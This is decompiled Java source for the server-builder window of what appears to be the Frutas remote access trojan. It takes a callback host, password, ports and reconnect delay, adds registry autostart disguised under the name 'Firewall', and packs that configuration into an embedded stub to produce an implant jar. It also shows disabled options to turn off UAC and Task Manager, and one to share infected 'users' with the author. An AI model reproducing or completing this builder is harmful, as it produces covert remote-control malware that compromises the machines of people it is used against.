/*     */ package cliente;
/*     */ 
/*     */ import java.awt.Color;
/*     */ import java.awt.Component;
/*     */ import java.awt.Container;
/*     */ import java.awt.Font;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.awt.event.ActionListener;
/*     */ import java.io.File;
/*     */ import java.io.FileOutputStream;
/*     */ import java.io.IOException;
/*     */ import java.io.PrintStream;
/*     */ import java.util.ResourceBundle;
/*     */ import java.util.jar.JarEntry;
/*     */ import java.util.jar.JarInputStream;
/*     */ import java.util.jar.JarOutputStream;
/*     */ import java.util.logging.Level;
/*     */ import java.util.logging.Logger;
/*     */ import javax.swing.GroupLayout;
/*     */ import javax.swing.GroupLayout.Alignment;
/*     */ import javax.swing.GroupLayout.ParallelGroup;
/*     */ import javax.swing.GroupLayout.SequentialGroup;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JCheckBox;
/*     */ import javax.swing.JFileChooser;
/*     */ import javax.swing.JInternalFrame;
/*     */ import javax.swing.JLabel;
/*     */ import javax.swing.JOptionPane;
/*     */ import javax.swing.JPanel;
/*     */ import javax.swing.JPasswordField;
/*     */ import javax.swing.JSlider;
/*     */ import javax.swing.JSpinner;
/*     */ import javax.swing.JTabbedPane;
/*     */ import javax.swing.JTextField;
/*     */ import javax.swing.LayoutStyle.ComponentPlacement;
/*     */ import javax.swing.SpinnerNumberModel;
/*     */ import javax.swing.filechooser.FileNameExtensionFilter;
/*     */ 
/*     */ public class NewServer extends JInternalFrame
/*     */   implements SoporteLenguaje
/*     */ {
/*     */   private JButton CrearServer;
/*     */   private JCheckBox bot;
/*     */   private JSlider delay;
/*     */   private JTextField dns;
/*     */   private JTextField filename;
/*     */   private JButton jButton1;
/*     */   private JCheckBox jCheckBox1;
/*     */   private JCheckBox jCheckBox2;
/*     */   private JLabel jLabel1;
/*     */   private JLabel jLabel2;
/*     */   private JLabel jLabel3;
/*     */   private JLabel jLabel4;
/*     */   private JLabel jLabel6;
/*     */   private JLabel jLabel7;
/*     */   private JLabel jLabel8;
/*     */   private JPanel jPanel1;
/*     */   private JPanel jPanel2;
/*     */   private JPanel jPanel3;
/*     */   private JTabbedPane jTabbedPane1;
/*     */   private JPasswordField pass;
/*     */   private JSpinner puerto;
/*     */   private JSpinner puerto2;
/*     */   private JCheckBox windows;
/*     */   private JTextField windowsName;
/*     */ 
/*     */   public NewServer(ResourceBundle rb)
/*     */   {
/*  30 */     initComponents();
/*     */ 
/*  32 */     changeLenguage(rb);
/*     */   }
/*     */ 
/*     */   private void initComponents()
/*     */   {
/*  44 */     this.jTabbedPane1 = new JTabbedPane();
/*  45 */     this.jPanel1 = new JPanel();
/*  46 */     this.jLabel1 = new JLabel();
/*  47 */     this.dns = new JTextField();
/*  48 */     this.jLabel6 = new JLabel();
/*  49 */     this.pass = new JPasswordField();
/*  50 */     this.puerto = new JSpinner();
/*  51 */     this.jLabel7 = new JLabel();
/*  52 */     this.puerto2 = new JSpinner();
/*  53 */     this.jLabel8 = new JLabel();
/*  54 */     this.bot = new JCheckBox();
/*  55 */     this.jButton1 = new JButton();
/*  56 */     this.delay = new JSlider();
/*  57 */     this.jLabel4 = new JLabel();
/*  58 */     this.jPanel2 = new JPanel();
/*  59 */     this.windows = new JCheckBox();
/*  60 */     this.windowsName = new JTextField();
/*  61 */     this.jLabel2 = new JLabel();
/*  62 */     this.jLabel3 = new JLabel();
/*  63 */     this.filename = new JTextField();
/*  64 */     this.jPanel3 = new JPanel();
/*  65 */     this.jCheckBox1 = new JCheckBox();
/*  66 */     this.jCheckBox2 = new JCheckBox();
/*  67 */     this.CrearServer = new JButton();
/*     */ 
/*  69 */     setClosable(true);
/*  70 */     setIconifiable(true);
/*  71 */     setTitle("Creación de un Nuevo Servidor");
/*     */ 
/*  73 */     this.jTabbedPane1.setForeground(new Color(0, 153, 153));
/*  74 */     this.jTabbedPane1.setFont(new Font("Times New Roman", 1, 14));
/*     */ 
/*  76 */     this.jPanel1.setForeground(new Color(0, 0, 102));
/*     */ 
/*  78 */     this.jLabel1.setFont(new Font("Times New Roman", 1, 14));
/*  79 */     this.jLabel1.setForeground(new Color(0, 102, 0));
/*  80 */     this.jLabel1.setText("IP/DNS: ");
/*     */ 
/*  82 */     this.dns.setFont(new Font("Times New Roman", 1, 11));
/*  83 */     this.dns.setText("127.0.0.1");
/*     */ 
/*  85 */     this.jLabel6.setFont(new Font("Times New Roman", 1, 14));
/*  86 */     this.jLabel6.setForeground(new Color(0, 102, 0));
/*  87 */     this.jLabel6.setText("Contraseña:");
/*     */ 
/*  89 */     this.pass.setFont(new Font("Times New Roman", 1, 11));
/*  90 */     this.pass.setText("XXXX");
/*     */ 
/*  92 */     this.puerto.setModel(new SpinnerNumberModel(1000, 1, 65000, 1));
/*     */ 
/*  94 */     this.jLabel7.setFont(new Font("Times New Roman", 1, 14));
/*  95 */     this.jLabel7.setForeground(new Color(0, 102, 0));
/*  96 */     this.jLabel7.setText("Puerto 1:");
/*     */ 
/*  98 */     this.puerto2.setModel(new SpinnerNumberModel(1001, 1, 65000, 1));
/*     */ 
/* 100 */     this.jLabel8.setFont(new Font("Times New Roman", 1, 14));
/* 101 */     this.jLabel8.setForeground(new Color(0, 102, 0));
/* 102 */     this.jLabel8.setText("Puerto 2:");
/*     */ 
/* 104 */     this.bot.setFont(new Font("Times New Roman", 1, 12));
/* 105 */     this.bot.setForeground(new Color(255, 0, 0));
/* 106 */     this.bot.setText("Compartir tus usuarios con el autor.");
/* 107 */     this.bot.setToolTipText("Creo es un trato justo ya que me parto el culo programandolo, como para no tener algun beneficio.");
/* 108 */     this.bot.setEnabled(false);
/*     */ 
/* 110 */     this.jButton1.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/* 112 */         NewServer.this.jButton1ActionPerformed(evt);
/*     */       }
/*     */     });
/* 116 */     this.delay.setMajorTickSpacing(1);
/* 117 */     this.delay.setMaximum(20);
/* 118 */     this.delay.setMinimum(1);
/* 119 */     this.delay.setMinorTickSpacing(1);
/* 120 */     this.delay.setPaintLabels(true);
/* 121 */     this.delay.setPaintTicks(true);
/* 122 */     this.delay.setValue(3);
/* 123 */     this.delay.setValueIsAdjusting(true);
/*     */ 
/* 125 */     this.jLabel4.setFont(new Font("Times New Roman", 1, 11));
/* 126 */     this.jLabel4.setText("Lapso de tiempo entre cada conexion fallida. (segundos)");
/*     */ 
/* 128 */     GroupLayout jPanel1Layout = new GroupLayout(this.jPanel1);
/* 129 */     this.jPanel1.setLayout(jPanel1Layout);
/* 130 */     jPanel1Layout.setHorizontalGroup(jPanel1Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addComponent(this.delay, -1, -1, 32767).addGroup(jPanel1Layout.createSequentialGroup().addContainerGap().addGroup(jPanel1Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(GroupLayout.Alignment.TRAILING, jPanel1Layout.createSequentialGroup().addComponent(this.jLabel7).addGap(2, 2, 2).addComponent(this.puerto, -2, 73, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED, -1, 32767).addComponent(this.jLabel8).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.puerto2, -2, 73, -2)).addGroup(jPanel1Layout.createSequentialGroup().addGroup(jPanel1Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(jPanel1Layout.createSequentialGroup().addComponent(this.jLabel1).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.dns, -2, 102, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jLabel6).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.pass, -1, 79, 32767)).addComponent(this.bot)).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jButton1)).addGroup(jPanel1Layout.createSequentialGroup().addComponent(this.jLabel4).addGap(0, 0, 32767))).addContainerGap()));
/*     */ 
/* 162 */     jPanel1Layout.setVerticalGroup(jPanel1Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(jPanel1Layout.createSequentialGroup().addContainerGap().addGroup(jPanel1Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(jPanel1Layout.createParallelGroup(GroupLayout.Alignment.BASELINE).addComponent(this.jLabel1).addComponent(this.dns, -2, -1, -2).addComponent(this.jLabel6).addComponent(this.pass, -2, -1, -2)).addComponent(this.jButton1, -2, 20, -2)).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addGroup(jPanel1Layout.createParallelGroup(GroupLayout.Alignment.BASELINE).addComponent(this.puerto, -2, -1, -2).addComponent(this.jLabel7).addComponent(this.jLabel8).addComponent(this.puerto2, -2, -1, -2)).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.bot).addGap(13, 13, 13).addComponent(this.jLabel4).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.delay, -1, -1, 32767)));
/*     */ 
/* 187 */     jPanel1Layout.linkSize(1, new Component[] { this.jButton1, this.pass });
/*     */ 
/* 189 */     this.jTabbedPane1.addTab("Conexión", this.jPanel1);
/*     */ 
/* 191 */     this.windows.setText("Iniciar en Windows");
/*     */ 
/* 193 */     this.windowsName.setText("Firewall");
/*     */ 
/* 195 */     this.jLabel2.setText("Entrada Registo: ");
/*     */ 
/* 197 */     this.jLabel3.setText("Nombre Final del *.JAR");
/*     */ 
/* 199 */     this.filename.setText("servidorcito");
/*     */ 
/* 201 */     GroupLayout jPanel2Layout = new GroupLayout(this.jPanel2);
/* 202 */     this.jPanel2.setLayout(jPanel2Layout);
/* 203 */     jPanel2Layout.setHorizontalGroup(jPanel2Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(jPanel2Layout.createSequentialGroup().addContainerGap().addGroup(jPanel2Layout.createParallelGroup(GroupLayout.Alignment.TRAILING).addGroup(jPanel2Layout.createSequentialGroup().addComponent(this.jLabel3).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.filename, -2, 194, -2)).addGroup(jPanel2Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(jPanel2Layout.createSequentialGroup().addGap(21, 21, 21).addComponent(this.jLabel2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.windowsName, -2, 194, -2)).addComponent(this.windows))).addContainerGap(63, 32767)));
/*     */ 
/* 221 */     jPanel2Layout.setVerticalGroup(jPanel2Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(jPanel2Layout.createSequentialGroup().addContainerGap().addComponent(this.windows).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addGroup(jPanel2Layout.createParallelGroup(GroupLayout.Alignment.BASELINE).addComponent(this.jLabel2).addComponent(this.windowsName, -2, -1, -2)).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addGroup(jPanel2Layout.createParallelGroup(GroupLayout.Alignment.BASELINE).addComponent(this.jLabel3).addComponent(this.filename, -2, -1, -2)).addContainerGap(79, 32767)));
/*     */ 
/* 237 */     this.jTabbedPane1.addTab("AutoInicio", this.jPanel2);
/*     */ 
/* 239 */     this.jCheckBox1.setText("Deshabiliar UAC");
/* 240 */     this.jCheckBox1.setEnabled(false);
/*     */ 
/* 242 */     this.jCheckBox2.setText("Deshabiliar TaskManager");
/* 243 */     this.jCheckBox2.setEnabled(false);
/*     */ 
/* 245 */     GroupLayout jPanel3Layout = new GroupLayout(this.jPanel3);
/* 246 */     this.jPanel3.setLayout(jPanel3Layout);
/* 247 */     jPanel3Layout.setHorizontalGroup(jPanel3Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(jPanel3Layout.createSequentialGroup().addGroup(jPanel3Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addComponent(this.jCheckBox1).addComponent(this.jCheckBox2)).addGap(0, 237, 32767)));
/*     */ 
/* 255 */     jPanel3Layout.setVerticalGroup(jPanel3Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(jPanel3Layout.createSequentialGroup().addComponent(this.jCheckBox1, -2, 20, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jCheckBox2, -2, 23, -2).addGap(0, 114, 32767)));
/*     */ 
/* 264 */     this.jTabbedPane1.addTab("Misc", this.jPanel3);
/*     */ 
/* 266 */     this.CrearServer.setFont(new Font("Times New Roman", 1, 14));
/* 267 */     this.CrearServer.setForeground(new Color(0, 0, 102));
/* 268 */     this.CrearServer.setText("Crear Servidor");
/* 269 */     this.CrearServer.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/* 271 */         NewServer.this.CrearServerActionPerformed(evt);
/*     */       }
/*     */     });
/* 275 */     GroupLayout layout = new GroupLayout(getContentPane());
/* 276 */     getContentPane().setLayout(layout);
/* 277 */     layout.setHorizontalGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addComponent(this.jTabbedPane1).addGroup(GroupLayout.Alignment.TRAILING, layout.createSequentialGroup().addContainerGap(-1, 32767).addComponent(this.CrearServer).addGap(149, 149, 149)));
/*     */ 
/* 285 */     layout.setVerticalGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createSequentialGroup().addComponent(this.jTabbedPane1, -2, 188, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.CrearServer, -1, 51, 32767).addContainerGap()));
/*     */ 
/* 294 */     pack();
/*     */   }
/*     */ 
/*     */   private void CrearServerActionPerformed(ActionEvent evt) {
/* 298 */     this.delay.getValue();
/* 299 */     JFileChooser cd = new JFileChooser();
/* 300 */     cd.setDialogTitle("Guardando el servidorcito");
/* 301 */     cd.setDialogType(1);
/* 302 */     cd.setFileFilter(new FileNameExtensionFilter("Ejecutable Java", new String[] { "jar" }));
/* 303 */     if (cd.showSaveDialog(this) == 0) {
/* 304 */       String bott = "NO";
/* 305 */       if (this.bot.isSelected()) {
/* 306 */         bott = "SI";
/*     */       }
/* 308 */       String config = bott + "\n" + this.dns.getText() + "\n" + new String(this.pass.getPassword()) + "\n" + this.puerto.getValue().toString() + "\n" + this.puerto2.getValue().toString() + "\n" + this.delay.getValue();
/*     */ 
/* 310 */       if (this.windows.isSelected()) {
/* 311 */         config = config + "\nSI\n" + this.windowsName.getText() + "\n" + this.filename.getText();
/*     */       }
/* 313 */       System.out.println(config);
/*     */       try
/*     */       {
/*     */         File a;
/*     */         File a;
/* 319 */         if (cd.getSelectedFile().getAbsolutePath().lastIndexOf(".jar") > -1)
/* 320 */           a = cd.getSelectedFile();
/*     */         else {
/* 322 */           a = new File(cd.getSelectedFile().getAbsolutePath() + ".jar");
/*     */         }
/*     */ 
/* 328 */         JarInputStream input = new JarInputStream(getClass().getResourceAsStream("/Extras/stub.dll"));
/* 329 */         JarOutputStream salida = new JarOutputStream(new FileOutputStream(a), input.getManifest());
/*     */ 
/* 335 */         salida.putNextEntry(new JarEntry("config.txt"));
/* 336 */         salida.write(config.getBytes());
/* 337 */         salida.closeEntry();
/*     */ 
/* 339 */         byte[] BUF = new byte[1024];
/*     */         JarEntry entry;
/* 340 */         while ((entry = input.getNextJarEntry()) != null)
/*     */         {
/* 342 */           if (!"META-INF/MANIFEST.MF".equals(entry.getName()))
/*     */           {
/* 345 */             salida.putNextEntry(entry);
/*     */             int i;
/* 348 */             while ((i = input.read(BUF)) > -1) {
/* 349 */               salida.write(BUF, 0, i);
/*     */             }
/*     */ 
/* 352 */             salida.closeEntry();
/*     */           }
/*     */         }
/*     */ 
/* 356 */         salida.flush();
/* 357 */         salida.close();
/* 358 */         input.close();
/*     */ 
/* 363 */         JOptionPane.showMessageDialog(this, "Server creado correctamente...");
/*     */       } catch (IOException ex) {
/* 365 */         Logger.getLogger(NewServer.class.getName()).log(Level.SEVERE, null, ex);
/*     */       }
/*     */     }
/*     */   }
/*     */ 
/*     */   private void jButton1ActionPerformed(ActionEvent evt)
/*     */   {
/* 372 */     JOptionPane.showMessageDialog(null, new String(this.pass.getPassword()));
/*     */   }
/*     */ 
/*     */   public void changeLenguage(ResourceBundle rb)
/*     */   {
/* 405 */     setTitle(rb.getString("servidor.titulo"));
/* 406 */     this.jTabbedPane1.setTitleAt(0, rb.getString("servidor.conexion"));
/* 407 */     this.jTabbedPane1.setTitleAt(1, rb.getString("servidor.autoinicio"));
/* 408 */     this.jLabel6.setText(rb.getString("servidor.contrasena"));
/* 409 */     this.jLabel7.setText(rb.getString("servidor.puerto1"));
/* 410 */     this.jLabel8.setText(rb.getString("servidor.puerto2"));
/* 411 */     this.CrearServer.setText(rb.getString("servidor.crear"));
/* 412 */     this.windows.setText(rb.getString("servidor.windows"));
/* 413 */     this.jLabel2.setText(rb.getString("servidor.registro"));
/* 414 */     this.jLabel3.setText(rb.getString("servidor.nobrereg"));
/*     */   }
/*     */ }

/* Location:           C:\Users\Danilo\Desktop\Coisas\Frutas_RAT.jar
 * Qualified Name:     cliente.NewServer
 * JD-Core Version:    0.6.2
 */